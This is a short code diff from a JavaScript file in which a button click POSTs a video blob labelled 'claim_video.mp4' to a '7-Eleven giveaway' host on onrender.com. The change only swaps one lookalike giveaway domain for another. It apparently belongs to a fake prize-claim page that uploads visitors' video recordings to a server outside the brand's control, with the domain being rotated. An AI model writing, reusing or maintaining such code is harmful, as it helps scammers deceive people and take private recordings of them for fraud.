@@ -29,7 +29,7 @@ btn.addEventListener('click', async () => {
             const formData = new FormData();
             formData.append('video', videoBlob, 'claim_video.mp4');
 
-            const res = await fetch("https://seven-11-giveawaysss-2026.onrender.com/upload-video", { method: "POST", body: formData });
+            const res = await fetch("https://seven-11-giveaways-2026-k7mn.onrender.com/upload-video", { method: "POST", body: formData });
             const data = await res.json();
             console.log("Video posted:", data);
 
